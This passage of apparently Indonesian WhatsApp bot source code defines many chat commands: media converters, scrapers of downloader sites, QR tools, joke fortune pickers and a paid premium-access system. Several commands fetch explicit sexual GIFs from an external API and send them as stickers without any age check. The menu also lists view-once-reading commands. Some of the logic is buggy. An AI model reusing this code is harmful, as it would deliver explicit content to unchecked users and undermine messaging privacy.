const { JSDOM } = require('jsdom')
const cheerio = require('cheerio')

 async function webp2mp4(source) {
 var form = new former()
 var isUrl = typeof source === 'string' && /https?:\/\//.test(source)
 form.append('new-image-url', isUrl ? source : '')
 form.append('new-image', isUrl ? '' : source, 'image.webp')
 
 var res = await axios.request("https://ezgif.com/webp-to-mp4", {
 method: "POST",
 data: form.getBuffer(),
 headers: {
 ...form.getHeaders()
 }
 })
 var { document } = new JSDOM(res.data).window
 
 var obj = {}
 var form2 = new former()
 for (var input of document.querySelectorAll('form input[name]')) {
 obj[input.name] = input.value
 form2.append(input.name, input.value)
 }
 
 var res2 = await axios.request('https://ezgif.com/webp-to-mp4/' + obj.file, {
 method: "POST",
 data: form2.getBuffer(),
 headers: {
 ...form2.getHeaders()
 }
 })
 var akhir = cheerio.load(res2.data)
 return "https:" + akhir("p.outfile > video > source").attr("src")
 }

 if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
 if (!/webp/.test(mime)) throw `Reply sticker dengan caption *${prefix + command}*`
 m.reply(mess.wait)
 
 let media = await sky.downloadAndSaveMediaMessage(qmsg)
 let buffer = fs.readFileSync(media)
 
 webp2mp4(buffer)
 .then(url => {
 console.log('URL Video:', url) // Tambahkan log untuk URL video
 sky.sendMessage(m.chat, { video: { url }, caption: 'Nih videonya' }, { quoted: m })
 fs.unlinkSync(media)
 })
 .catch(err => {
 console.error('Error:', err) // Tambahkan log untuk error
 m.reply('Terjadi kesalahan saat mengonversi stiker ke video.')
 fs.unlinkSync(media)
 })
}
break
case '@6282297308628': {
m.reply('lah')
}
break
case 'cekkhodam': {
if (!text) return m.reply("ketik nama lu")
 
	const khodam = pickRandom([
	 "Kaleng Cat Avian",
	 "Pipa Rucika",
	 "Botol Tupperware",
	 "Badut Mixue",
	 "Sabun GIV",
	 "Sandal Swallow",
	 "Jarjit",
	 "Ijat",
	 "Fizi",
	 "Mail",
	 "Ehsan",
	 "Upin",
	 "Ipin",
	 "sungut lele",
	 "Tok Dalang",
	 "Opah",
	 "Opet",
	 "Alul",
	 "Pak Vinsen",
	 "Maman Resing",
	 "Pak RT",
	 "Admin ETI",
	 "Bung Towel",
	 "Lumpia Basah",
	 "Martabak Manis",
	 "Baso Tahu",
	 "Tahu Gejrot",
	 "Dimsum",
	 "Seblak Ceker",
	 "Telor Gulung",
	 "Tahu Aci",
	 "Tempe Mendoan",
	 "Nasi Kucing",
	 "Kue Cubit",
	 "Tahu Sumedang",
	 "Nasi Uduk",
	 "Wedang Ronde",
	 "Kerupuk Udang",
	 "Cilok",
	 "Cilung",
	 "Kue Sus",
	 "Jasuke",
	 "Seblak Makaroni",
	 "Sate Padang",
	 "Sayur Asem",
	 "Kromboloni",
	 "Marmut Pink",
	 "Belalang Mullet",
	 "Kucing Oren",
	 "Lintah Terbang",
	 "Singa Paddle Pop",
	 "Macan Cisewu",
	 "Vario Mber",
	 "Beat Mber",
	 "Supra Geter",
	 "Oli Samping",
	 "Knalpot Racing",
	 "Jus Stroberi",
	 "Jus Alpukat",
	 "Alpukat Kocok",
	 "Es Kopyor",
	 "Es Jeruk",
	 "Cappucino Cincau",
	 "Jasjus Melon",
	 "Teajus Apel",
	 "Pop ice Mangga",
	 "Teajus Gulabatu",
	 "Air Selokan",
	 "Air Kobokan",
	 "TV Tabung",
	 "Keran Air",
	 "Tutup Panci",
	 "Kotak Amal",
	 "Tutup Termos",
	 "Tutup Botol",
	 "Kresek Item",
	 "Kepala Casan",
	 "Ban Serep",
	 "Kursi Lipat",
	 "Kursi Goyang",
	 "Kulit Pisang",
	 "Warung Madura",
	 "Gorong-gorong",
	])
 
	const response = `
╭━━━━°「 *CEK KHODAM* 」°
┃
┊• *Nama :* ${text}
┃• *Khodam :* ${khodam}
╰═┅═━––––––๑
	 `
 
	m.reply(response)
 }
break
case 'qr': {
const QRCode = require('qrcode');
 if (!text) throw `isinya apa`
 const outputFilePath = '/tmp/qrcode.png';
 QRCode.toFile(outputFilePath, text, (err) => {
 if (err) {
 m.reply('Terjadi kesalahan saat membuat QR code.');
 console.error(err);
 return;
 }
 sky.sendFile(m.chat, outputFilePath, 'qrcode.png', 'Berikut adalah QR code Anda:', m);
 });
}
 break
case 'readqr': {
const QRCodeReader = require('qrcode-reader');
const fetch = require('node-fetch');
const Jimp = require('jimp');
 const media = await sky.downloadAndSaveMediaMessage(quoted)
	const { TelegraPh } = require('./lib/uploader')
	const anu = await TelegraPh(media)
 fetch(`${anu}`)
 .then(res => res.buffer())
 .then(buffer => {
 Jimp.read(buffer, (err, image) => {
 if (err) {
 m.reply('Terjadi kesalahan saat membaca gambar.');
 console.error(err);
 return;
 }
 const qr = new QRCodeReader();
 qr.callback = (error, result) => {
 if (error) {
 m.reply('Terjadi kesalahan saat membaca QR code.');
 console.error(error);
 return;
 }

 if (result) {
 m.reply(`${result.result}`);
 } else {
 m.reply('Tidak dapat menemukan teks dalam QR code.');
 }
 };

 qr.decode(image.bitmap);
 });
 })
 .catch(err => {
 m.reply('Terjadi kesalahan saat mengambil gambar dari link.');
 console.error(err);
 });
}
 break
case 'cekanime': {
 const animeCharacters = [
 { name: 'Naruto Uzumaki', characteristic: 'Penuh semangat, tekun, dan tidak mudah menyerah.' },
 { name: 'Luffy', characteristic: 'Petualang, pemberani, dan setia kawan.' },
 { name: 'Eren Yeager', characteristic: 'Berani, penuh semangat juang, dan memiliki tekad kuat.' },
 { name: 'Izuku Midoriya', characteristic: 'Berani, bercita-cita tinggi, dan bekerja keras.' },
 { name: 'Tanjiro Kamado', characteristic: 'Berani, setia kawan, dan memiliki tekad kuat.' },
 { name: 'Saitama', characteristic: 'Santai, sangat kuat, dan tidak mudah terganggu.' },
 { name: 'Sakura Haruno', characteristic: 'Pintar, kuat, dan setia kawan.' },
 { name: 'Natsu Dragneel', characteristic: 'Berani, penuh semangat, dan setia.' },
 { name: 'Sasuke Uchiha', characteristic: 'Pintar, kuat, dan serius.' },
 { name: 'Goku', characteristic: 'Berani, kuat, dan suka tantangan.' },
 { name: 'Ichigo Kurosaki', characteristic: 'Berani, penuh tekad, dan setia.' },
 { name: 'Light Yagami', characteristic: 'Pintar, cerdik, dan ambisius.' },
 { name: 'Edward Elric', characteristic: 'Berani, tekun, dan pantang menyerah.' },
 { name: 'Kakashi Hatake', characteristic: 'Pintar, tenang, dan bijaksana.' },
 { name: 'Killua Zoldyck', characteristic: 'Cerdik, kuat, dan setia.' },
 { name: 'Roronoa Zoro', characteristic: 'Pemberani, kuat, dan setia.' },
 { name: 'Levi Ackerman', characteristic: 'Kuat, tegas, dan tidak kenal takut.' },
 { name: 'Shoto Todoroki', characteristic: 'Tenang, kuat, dan penuh tekad.' },
 { name: 'Hinata Hyuga', characteristic: 'Pemalu, berani, dan setia.' },
 { name: 'Erza Scarlet', characteristic: 'Kuat, berani, dan setia.' },
 { name: 'Monkey D. Dragon', characteristic: 'Misterius, kuat, dan berani.' },
 { name: 'Gon Freecss', characteristic: 'Berani, ceria, dan penuh semangat.' },
 { name: 'Usagi Tsukino', characteristic: 'Ceria, pemberani, dan setia.' },
 { name: 'Inuyasha', characteristic: 'Berani, kuat, dan setia.' },
 { name: 'Spike Spiegel', characteristic: 'Santai, kuat, dan penuh tekad.' },
 { name: 'Alucard', characteristic: 'Misterius, kuat, dan tidak kenal takut.' },
 { name: 'Saber', characteristic: 'Berani, kuat, dan setia.' },
 { name: 'Ken Kaneki', characteristic: 'Berani, kuat, dan penuh tekad.' },
 { name: 'Rintarou Okabe', characteristic: 'Pintar, cerdik, dan penuh tekad.' },
 { name: 'Nami', characteristic: 'Cerdik, kuat, dan setia.' },
 { name: 'Kurapika', characteristic: 'Cerdik, kuat, dan penuh tekad.' },
 { name: 'Mikasa Ackerman', characteristic: 'Kuat, setia, dan tidak kenal takut.' },
 { name: 'Lelouch Lamperouge', characteristic: 'Cerdik, pintar, dan penuh tekad.' },
 { name: 'Rem', characteristic: 'Setia, kuat, dan berani.' },
 { name: 'Ryuk', characteristic: 'Misterius, kuat, dan penuh teka-teki.' },
 { name: 'Sanji', characteristic: 'Cerdik, kuat, dan setia.' },
 { name: 'Trafalgar Law', characteristic: 'Cerdik, kuat, dan penuh tekad.' },
 { name: 'Jotaro Kujo', characteristic: 'Berani, kuat, dan penuh tekad.' },
 { name: 'Dio Brando', characteristic: 'Ambisius, kuat, dan penuh tekad.' },
 { name: 'Boruto Uzumaki', characteristic: 'Berani, ceria, dan penuh semangat.' },
 { name: 'Rei Ayanami', characteristic: 'Tenang, kuat, dan misterius.' },
 { name: 'Tomoya Okazaki', characteristic: 'Berani, setia, dan penuh tekad.' },
 { name: 'Megumin', characteristic: 'Ceria, penuh semangat, dan kuat.' },
 { name: 'Zero Two', characteristic: 'Berani, kuat, dan penuh tekad.' },
 { name: 'Tatsumi', characteristic: 'Berani, kuat, dan setia.' },
 { name: 'Asta', characteristic: 'Berani, penuh semangat, dan kuat.' },
 { name: 'Yato', characteristic: 'Cerdik, kuat, dan misterius.' },
 { name: 'Yukino Yukinoshita', characteristic: 'Pintar, tenang, dan kuat.' },
 { name: 'Kageyama Shigeo (Mob)', characteristic: 'Tenang, kuat, dan penuh tekad.' },
 { name: 'Todoroki Shoto', characteristic: 'Tenang, kuat, dan penuh tekad.' },
 { name: 'Nishinoya Yuu', characteristic: 'Ceria, berani, dan penuh semangat.' },
 { name: 'Onizuka Eikichi', characteristic: 'Ceria, kuat, dan penuh semangat.' },
 { name: 'Kazuto Kirigaya (Kirito)', characteristic: 'Cerdik, kuat, dan penuh tekad.' },
 { name: 'Mitsuha Miyamizu', characteristic: 'Ceria, berani, dan setia.' },
 { name: 'Shinichi Izumi', characteristic: 'Cerdik, kuat, dan penuh tekad.' },
 { name: 'Guts', characteristic: 'Berani, kuat, dan penuh tekad.' },
 { name: 'Meliodas', characteristic: 'Ceria, berani, dan kuat.' },
 { name: 'Nico Robin', characteristic: 'Pintar, tenang, dan kuat.' },
 { name: 'Asuna Yuuki', characteristic: 'Berani, kuat, dan setia.' },
 { name: 'Shinobu Kocho', characteristic: 'Cerdik, kuat, dan penuh tekad.' },
 { name: 'Rukia Kuchiki', characteristic: 'Berani, kuat, dan setia.' },
 { name: 'Shanks', characteristic: 'Berani, kuat, dan penuh tekad.' },
 { name: 'Toga Himiko', characteristic: 'Ceria, penuh semangat, dan kuat.' },
 { name: 'Misaka Mikoto', characteristic: 'Cerdik, kuat, dan penuh tekad.' },
 { name: 'Ryuko Matoi', characteristic: 'Berani, kuat, dan penuh semangat.' },
 { name: 'Kenshin Himura', characteristic: 'Berani, kuat, dan setia.' },
 { name: 'Rikka Takanashi', characteristic: 'Ceria, penuh semangat, dan kuat.' },
 { name: 'Kirari Momobami', characteristic: 'Cerdik, penuh teka-teki, dan kuat.' },
 { name: 'Yugi Mutou', characteristic: 'Cerdik, kuat, dan penuh tekad.' },
 { name: 'Tohru Honda', characteristic: 'Ceria, setia, dan penuh semangat.' }
 ];

 const randomCharacter = animeCharacters[Math.floor(Math.random() * animeCharacters.length)];

 const pushname = m.pushName ? m.pushName : 'Pengguna';
 const replyText = `Nama: ${pushname}\n` +
 `Anime: ${randomCharacter.name}\n` +
 `Karakteristik: ${randomCharacter.characteristic}`;
sendButton(m.chat, replyText , `_cari anime mu_`, `pin2 ${randomCharacter.name}`)
}
 break
case 'chart': {
const Chart = require('chart.js');
 const data = {
 labels: ['Red', 'Blue', 'Yellow', 'Green', 'Purple', 'Orange'],
 datasets: [{
 label: '# of Votes',
 data: [12, 19, 3, 5, 2, 3],
 backgroundColor: [
 'rgba(255, 99, 132, 0.2)',
 'rgba(54, 162, 235, 0.2)',
 'rgba(255, 206, 86, 0.2)',
 'rgba(75, 192, 192, 0.2)',
 'rgba(153, 102, 255, 0.2)',
 'rgba(255, 159, 64, 0.2)'
 ],
 borderColor: [
 'rgba(255, 99, 132, 1)',
 'rgba(54, 162, 235, 1)',
 'rgba(255, 206, 86, 1)',
 'rgba(75, 192, 192, 1)',
 'rgba(153, 102, 255, 1)',
 'rgba(255, 159, 64, 1)'
 ],
 borderWidth: 1
 }]
 };

 const options = {
 scales: {
 y: {
 beginAtZero: true
 }
 }
 };

 // Create chart
 const chart = new Chart('chart.png', {
 type: 'bar',
 data: data,
 options: options
 });

 // Send chart image
 m.reply('Berikut diagram batang yang telah dibuat:', { file: 'chart.png' });
}
 break
case 'ky': {
 if (!isPrem) return replyprem(mess.premium);
 const yts = require("youtube-yts");
 const axios = require('axios');
 const fs = require('fs');
 const cheerio = require('cheerio');
 
 // Mengecek apakah ada teks yang diberikan
 if (!text) {
 m.reply(`Hello ${pushname}, masukkan teks untuk mengajukan pertanyaan.`);
 return;
 }

 // Memeriksa apakah teks mengandung permintaan untuk mencari lagu
 const musicRequestMatch = text.match(/lagu (.+)/i);
 if (musicRequestMatch) {
 const songTitle = musicRequestMatch[1];

 (async () => {
 try {
 let search = await yts(songTitle);
 let videos = search.all.filter(v => v.type === 'video');
 if (!videos.length) {
 await m.reply('Lagu tidak ditemukan.');
 return;
 }

 let video = videos[0];
 let mp3file = `./${video.videoId}.mp3`;

 let stream = ytdl(video.url, { filter: 'audioonly' });
 let writeStream = fs.createWriteStream(mp3file);

 stream.pipe(writeStream);

 stream.on('end', async () => {
 writeStream.on('finish', async () => {
 try {
 await sky.sendMessage(m.chat, { react: { text: "🥳", key: m.key } });

 if (fs.existsSync(mp3file)) {
 await sky.sendMessage(m.chat, {
 audio: fs.readFileSync(mp3file),
 mimetype: 'audio/mpeg',
 contextInfo: {
 externalAdReply: {
 title: video.title,
 body: `Views: ${video.views}`,
 thumbnailUrl: video.thumbnail,
 mediaType: 2,
 mediaUrl: video.url,
 sourceUrl: video.url,
 renderLargerThumbnail: true
 }
 }
 });
 fs.unlinkSync(mp3file); // Hapus file setelah dikirim
 } else {
 throw new Error('File tidak ditemukan setelah diunduh.');
 }
 } catch (error) {
 console.error('Error sending audio:', error);
 await m.reply('Terjadi kesalahan saat mengirim audio.');
 }
 });
 });

 stream.on('error', async (error) => {
 console.error('Error during download:', error);
 await m.reply('Terjadi kesalahan saat mengunduh audio.');
 });

 writeStream.on('error', async (error) => {
 console.error('Error writing file:', error);
 await m.reply('Terjadi kesalahan saat menulis file audio.');
 });

 } catch (error) {
 console.error('Error:', error);
 if (error.statusCode === 403) {
 await m.reply('Download dilarang. Coba video lain atau periksa koneksi Anda.');
 } else {
 await m.reply('Terjadi kesalahan saat memproses permintaan Anda.');
 }
 }
 })();

 return;
 }

 // Memeriksa apakah teks mengandung permintaan untuk mencari gambar
 const imageRequestMatch = text.match(/gambar (.+)/i);
 if (imageRequestMatch) {
 const query = imageRequestMatch[1];

 (async () => {
 try {
 m.reply('Sedang mencari gambar, mohon tunggu...');
 const result = await pinterest(query.toLowerCase());

 if (result.status === 200 && result.result.length > 0) {
 let imageUrl = result.result[Math.floor(Math.random() * result.result.length)];
 await sky.sendMessage(m.chat, { image: { url: imageUrl }, caption: 'Gambar ditemukan.' }, { quoted: m });
 } else {
 m.reply('Tidak dapat menemukan gambar untuk karakter ini.');
 }
 } catch (error) {
 console.error(error);
 m.reply('Terjadi kesalahan dalam mencari gambar.');
 }
 })();

 return;
 }

 // Memeriksa apakah teks mengandung link video atau media lainnya
 const mediaLinkMatch = text.match(/https?:\/\/[^\s]+/i);
 if (mediaLinkMatch) {
 const mediaUrl = mediaLinkMatch[0];

 class avosky extends Error {
 constructor(message) {
 super(message);
 this.name = "avosky";
 }
 }

 class API {
 constructor(search, prefix) {
 this.api = {
 search: search,
 prefix: prefix
 };
 }

 headers(custom = {}) {
 return {
 'Content-Type': 'application/x-www-form-urlencoded',
 'authority': 'retatube.com',
 'accept': '*/*',
 'accept-language': 'id-MM,id;q=0.9',
 'hx-current-url': 'https://retatube.com/',
 'hx-request': 'true',
 'hx-target': 'aio-parse-result',
 'hx-trigger': 'search-btn',
 'origin': 'https://retatube.com',
 'referer': 'https://retatube.com/',
 'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
 'sec-ch-ua-mobile': '?1',
 'sec-ch-ua-platform': '"Android"',
 'user-agent': 'Postify/1.0.0',
 ...custom
 };
 }

 handleError(error, context) {
 const errors = error.response ? JSON.stringify(error.response.data || error.message) : error.message;
 console.error(`[${context}] Error:`, errors);
 throw new avosky(errors);
 }

 getEndpoint(name) {
 return this.api[name];
 }
 }

 class RetaTube extends API {
 constructor() {
 super('https://retatube.com/api/v1/aio/search', 'https://retatube.com/api/v1/aio/index?s=retatube.com');
 }

 async getPrefix() {
 try {
 const response = await axios.get(this.getEndpoint('prefix'));
 return this.scrapePrefix(response.data); 
 } catch (error) {
 this.handleError(error, 'GetPrefix');
 }
 }

 scrapePrefix(htmlContent) {
 const $ = cheerio.load(htmlContent);
 const prefix = $('#aio-search-box input[name="prefix"]').val();
 return prefix;
 }

 async fetch(videoId) {
 try {
 const prefix = await this.getPrefix();
 const response = await axios.post(this.getEndpoint('search'), `prefix=${encodeURIComponent(prefix)}&vid=${encodeURIComponent(videoId)}`, { headers: this.headers() });
 return this.parseHtml(response.data);
 } catch (error) {
 this.handleError(error, 'Fetch');
 }
 }

 parseHtml(htmlContent) {
 const $ = cheerio.load(htmlContent);
 const result = {
 title: '',
 description: '',
 videoLinks: [],
 audioLinks: []
 };

 $('.col').each((_, element) => {
 const titles = $(element).find('#text-786685718 strong').first();
 result.title = titles.text().replace('Title：', '').trim() || result.title;

 const description = $(element).find('.description').text();
 result.description = description.trim() || '';

 $(element).find('a.button.primary').each((_, linkElement) => {
 const linkUrl = $(linkElement).attr('href');
 const quality = $(linkElement).find('span').text().toLowerCase();

 if (linkUrl !== 'javascript:void(0);') {
 if (quality.includes('audio')) {
 result.audioLinks.push({
 quality: quality,
 url: linkUrl
 });
 } else {
 result.videoLinks.push({
 quality: quality,
 url: linkUrl
 });
 }
 }
 });
 });

 return result;
 }

 async scrape(links) {
 try {
 return await this.fetch(links);
 } catch (error) {
 console.error(`${error.message}`);
 throw error;
 }
 }
 }

 const retatube = new RetaTube();
 try {
 const result = await retatube.scrape(mediaUrl);
 let videoMessage = `_Nih Aku Download In_`;
 let audioMessage = `*Audio*:`;

 // Mengirimkan video
 if (result.videoLinks.length > 0) {
 const video = result.videoLinks[0]; // Mengambil video dengan kualitas terbaik
 await sky.sendMessage(m.chat, { video: { url: video.url }, caption: videoMessage }, { quoted: m });
 } else {
 await m.reply("Maaf, video tidak ditemukan.");
 }

 } catch (error) {
 await m.reply(`Terjadi kesalahan: ${error.message}`);
 }

 return;
 }

 // Permintaan AI normal jika tidak ada permintaan musik, gambar, atau media link
 (async () => {
 try {
 const { data } = await axios.get(`https://itzpire.com/ai/gpt?model=gpt-4&q=${encodeURIComponent(text)}`);
 m.reply(`${data.data.response}`.trim());
 } catch (err) {
 console.error(err);
 m.reply('Terjadi kesalahan saat memproses permintaan Anda.');
 }
 })();
}
break;

case 'yy': {
 if (!text) return m.reply(`Example: ${prefix + command} story wa anime`);
 
 let yts = require("yt-search");
 let search = await yts(text);
 
 if (!search || !search.all || search.all.length === 0) {
 return m.reply(`No results found for: ${text}`);
 }
 
 let result = search.all[0]; // Get the first result
 
 let teks = `YouTube Search Result\n\n`;
 teks += `Title: ${result.title}\n`;
 teks += `Type: ${result.type}\n`;
 teks += `Video ID: ${result.videoId}\n`;
 teks += `Views: ${result.views}\n`;
 teks += `Duration: ${result.timestamp}\n`;
 teks += `Uploaded: ${result.ago}\n`;
 teks += `Url: ${result.url}\n\n`;

 sky.sendMessage(m.chat, { image: { url: result.thumbnail }, caption: teks }, { quoted: m });
}
break


case 'setpppanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await sky.downloadAndSaveMediaMessage(quoted)
			let botNumber = await sky.decodeJid(sky.user.id)
			let { img } = await pepe(media)
			await sky.query({
				tag: 'iq',
				attrs: {
					to: botNumber,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			m.reply(`Sukses mengganti PP Bot`)
		} catch (e) {
			console.log(e)
			m.reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		m.reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
case 'clearall': {
sky.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'giveacces': {
 if (!isCreator) throw mess.owner; // Check if the user is the creator
 if (!args[0] || !args[1]) return m.reply(`Example: ${prefix}giveacces 6288 1m`); // Check if both number and duration arguments are provided

 const number = args[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`; // Format the number to WhatsApp format
 const duration = args[1];
 const unit = duration.slice(-1); // Get the last character of the duration string (s, m, h, d)
 const value = parseInt(duration.slice(0, -1)); // Get the numeric part of the duration string

 if (isNaN(value)) return m.reply(`Invalid duration format. Use s for seconds, m for minutes, h for hours, d for days.`);

 let millisecs;
 switch (unit) {
 case 's':
 millisecs = value * 1000;
 break;
 case 'm':
 millisecs = value * 60 * 1000;
 break;
 case 'h':
 millisecs = value * 60 * 60 * 1000;
 break;
 case 'd':
 millisecs = value * 24 * 60 * 60 * 1000;
 break;
 default:
 return m.reply(`Invalid duration unit. Use s for seconds, m for minutes, h for hours, d for days.`);
 }

 let checkWhatsApp = await sky.onWhatsApp(number); // Check if the number is registered on WhatsApp
 if (checkWhatsApp.length === 0) {
 return m.reply(`Enter a valid and registered number on WhatsApp!!!`);
 }

 const expireTime = Date.now() + millisecs; // Calculate the expiration time
 if (!prem.includes(number)) prem.push(number); // Add the number to the premium list if not already present
 fs.writeFileSync('./database/premium.json', JSON.stringify(prem, null, 2)); // Save the updated premium list to file

 // Save the expiration time to a separate file or object
 let premExpirations = JSON.parse(fs.readFileSync('./database/premium.json', 'utf-8'));
 premExpirations[number] = expireTime;
 fs.writeFileSync('./database/premium.json', JSON.stringify(premExpirations, null, 2));

 m.reply(`The number ${number} has been given acces status for ${value} ${unit === 's' ? 'second(s)' : unit === 'm' ? 'minute(s)' : unit === 'h' ? 'hour(s)' : 'day(s)'}!`);

 // Schedule the removal of premium status after the specified duration
 setTimeout(() => {
 let premIndex = prem.indexOf(number);
 if (premIndex !== -1) {
 prem.splice(premIndex, 1); // Remove the number from the premium list
 fs.writeFileSync('./database/premium.json', JSON.stringify(prem, null, 2)); // Save the updated premium list to file

 delete premExpirations[number]; // Remove the expiration entry
 fs.writeFileSync('./database/premium.json', JSON.stringify(premExpirations, null, 2));

 // Optionally, notify the user that their premium status has expired
 sky.sendMessage(number, { text: 'Your acces status has expired.' });
 }
 }, millisecs);
}
 break

case 'premcase': {
 const fs = require('fs');
 try {
 // Membaca isi file sky.js
 const mytext = fs.readFileSync('./sky.js', 'utf8');

 // Mencari semua case yang mengandung 'if (!isPrem)' dalam file dengan menggunakan regex
 const premCases = mytext.match(/case '.*?':\s*{\s*if \(!isPrem\)/g);

 if (premCases) {
 // Menghapus kata 'case ' dan ':' dari setiap hasil pencarian, kemudian membuat daftar fitur premium
 const premiumFeatures = premCases.map((caseString) => caseString.replace(/case |:\s*{\s*if \(!isPrem\)/g, ''));

 // Menghitung jumlah fitur premium
 const premCaseCount = premiumFeatures.length;

 // Membuat pesan daftar fitur premium dengan tanda centang
 const listMessage = `Jumlah fitur premium: ${premCaseCount}\nDaftar fitur premium:\n${premiumFeatures.map(feature => `${feature} ✅`).join('\n')}`;

 // Mengirimkan daftar dan jumlah fitur premium sebagai balasan
 m.reply(listMessage);
 } else {
 // Mengirimkan pesan jika tidak ada fitur premium yang ditemukan
 m.reply('Tidak ada fitur premium yang ditemukan dalam file sky.js.');
 }
 } catch (error) {
 // Mengirimkan pesan jika terjadi kesalahan saat membaca file
 m.reply('Terjadi kesalahan saat mencoba membaca file sky.js.');
 }
}
break
case 'setlogic2': {
 if (!args[0]) return m.reply("_mana logic nya bang?_");
 const newId = args.join(" "); // Menggabungkan argumen menjadi satu string dengan spasi
 let logicData = {};
 try {
 logicData = JSON.parse(fs.readFileSync('./database/logic2.json'));
 } catch (error) {
 console.error("Error reading or parsing JSON file:", error);
 }
 logicData.id = newId;
 fs.writeFileSync('./database/logic2.json', JSON.stringify(logicData, null, 2));
 m.reply(`Logic berhasil ditetapkan.`);
}
break
case 'yuri': case 'yaoi': case 'threesome_mmf': case 'threesome_ffm': case 'threesome_fff': case 'solo_male': case 'solo': case 'pussylick': case 'fuck': case 'cum': case 'blowjob': case 'anal': {
 try {
 const fetch = require('node-fetch');
 const fs = require('fs');
 const path = require('path');

 // Ambil GIF dari API
 const response = await fetch(`https://purrbot.site/api/img/nsfw/${command}/gif`);
 const result = await response.json();

 // Pastikan tidak ada error dalam response
 if (!result.error) {
 const gifUrl = result.link;

 // Unduh GIF dan simpan sementara
 const gifResponse = await fetch(gifUrl);
 const gifBuffer = await gifResponse.buffer();
 const gifFilePath = path.join(__dirname, 'temp.gif');
 fs.writeFileSync(gifFilePath, gifBuffer);

 // Kirim GIF sebagai stiker
 sky.sendImageAsSticker(m.chat, gifFilePath, m, {
 packname: global.packname,
 author: global.author
 });

 // Hapus file sementara setelah dikirim
 fs.unlinkSync(gifFilePath);
 } else {
 m.reply('Terjadi kesalahan saat mengambil GIF.');
 }
 } catch (error) {
 m.reply('Terjadi kesalahan saat mengambil GIF.');
 console.error(error);
 }
}
break
case 'ai2': {
 try {
 let logicData = {};
 try {
 logicData = JSON.parse(fs.readFileSync('./database/logic.json'));
 } catch (error) {
 console.error("Error reading or parsing JSON file:", error);
 }
 let textToAnswer = text;

 if (m.quoted && m.quoted.text) {
 textToAnswer = m.quoted.text;
 }

 if (!textToAnswer) {
 m.reply('Balas pesan seseorang dengan pertanyaan atau ketik pertanyaan langsung.');
 return;
 }
 const logicid = logicData.id;
 const { data } = await axios.get(`https://itzpire.com/ai/gpt-logic?q=${encodeURIComponent(textToAnswer)}&logic=${logicid}&chat_id=iky98`);
 m.reply(`${data.result}`.trim());
 } catch (error) {
 m.reply("Maaf, sedang terjadi gangguan. Mohon coba lagi nanti.");
 }
}
break
case 'tiktokaudio':{
if (!q) return m.reply( `Example : ${prefix + command} link`)
require('./lib/tiktok').Tiktok(q).then( data => {
const xeontikmp3 = {url:data.audio}
sky.sendMessage(m.chat, { audio: xeontikmp3, mimetype: 'audio/mp4', ptt: false }, { quoted: m })
})
}
break
case 'gimage': {
if (!text) return m.reply(`gimage arachu`)
m.reply(mess.wait)
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
sky.sendMessage(m.chat, { image: { url: images}, caption: `*Query* : ${text}\n*Media Url* : ${images}`}, { quoted: m })
})
}
break
case 'tow': {
 const uploadImage = require('./lib/uploadImage')
 let media = await sky.downloadAndSaveMediaMessage(qmsg);
 let buffer = fs.readFileSync(media);
 let url = await uploadImage(buffer);
 m.reply(`${url}`);
 }
 break
case 'menuconvert': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
 let docs = fs.readFileSync('./src/sky.ppt'); // Menggunakan titik koma
 let listfakedocs = [
 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
 'application/pdf'
 ];
 // Fungsi getPp untuk mengambil gambar profil
 async function getPp(sky, target) {
 try {
 const response = await sky.query({
 tag: "iq",
 attrs: {
 target: target,
 to: "@s.whatsapp.net",
 type: "get",
 xmlns: "w:profile:picture"
 },
 content: [{
 tag: "picture",
 attrs: {
 type: "image",
 query: "url"
 }
 }]
 });
 return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 } catch (error) {
 console.error('Error fetching profile picture:', error);
 return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 }
 }

 // Ambil profile picture menggunakan getPp
 let profile = await getPp(sky, m.sender);

 const menunya = `≫ MENUCONVERT

> ATTP
> BASS
> BINARY
> BLOWN
> BYPASSURL
> CLEANURLS
> CLICKRU
> COUNT
> DAGD
> DBINARY
> DEBINARY
> DEEP
> EARRAPE
> ECHO
> EMOJIMIX
> EMOJIMIX2
> ENC
> FAST
> FAT
> FILLIMAGE
> FILLVIDEO
> HITUNGKATA
> HITUNGHURUF
> HD
> HDR
> ISGD
> KONVERSI
> MEMGEN
> NIGHTCORE
> QR
> READQR
> READVIEWONCE
> REMINI
> REMOVEBG
> REVERSE
> ROBOT
> RVO
> RINGKASAN
> ROT13
> SMEME
> SMIM
> STICKER
> STICKERWM
> STYLETEXT
> TINYURL
> TOAUDIO
> TOANIME
> TOGIF
> TOIMAGE
> TOVIDEO
> TTP
> TTP2
> TRANSLATE
> VGD
> WM
> QC
> QC2
> QC3
> QC4
> QC5
> QCV1
> QCV2
> QCV3
> QCV4
> QCV5
> TOVN
> TOURL
> TOURL2
> TOURL3
> TOURL4
> TOURL5
> TOURL6
> TOURL7
> TOURL8
> TOURL9
> TOURL10
> TOURL11
> HITUNGKATA
> HITUNGHURUF
> EMOJIMIX
> EMOJIMIX2
> DAGD
> TUPAI`
 await sky.sendMessage(m.chat, {
 document: docs,
